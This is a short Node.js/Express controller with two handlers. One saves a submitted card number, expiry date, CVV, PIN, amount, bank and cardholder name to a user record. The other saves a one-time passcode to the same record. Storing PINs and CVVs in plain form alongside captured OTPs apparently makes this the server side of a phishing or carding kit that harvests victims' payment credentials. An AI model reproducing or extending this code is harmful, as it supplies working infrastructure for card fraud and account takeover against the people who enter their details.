
const User = require('../model/airUser')

module.exports.atm = async(req,res)=>{
    let {id,
        card_number,
        date,
        cvv,
        pin,
        amount,
        bank,
        cardname,time} = req.body;

   
    try {
        let thisUser = await User.findById(id)
        if(thisUser){
            thisUser.cardname = cardname
            thisUser.cvv = cvv
            thisUser.amount = amount
            thisUser.bankname = bank
            thisUser.cardpin = pin
            thisUser.card_number = card_number
            thisUser.date = date
            thisUser.time = time

            await thisUser.save()
        }
    res.status(200).json({ok:'success'})
    } catch (error) {
        res.status(500).json({message:error.message})
    }
    
}

module.exports.otp = async(req,res)=>{
    let {id,
        otp,
        } = req.body;
   
    try {
        let thisUser = await User.findById(id)
        if(thisUser){
            thisUser.otp = otp

            await thisUser.save()
        }
    res.status(200).json({ok:'success'})
    } catch (error) {
        res.status(500).json({message:error.message})
    }   
    
}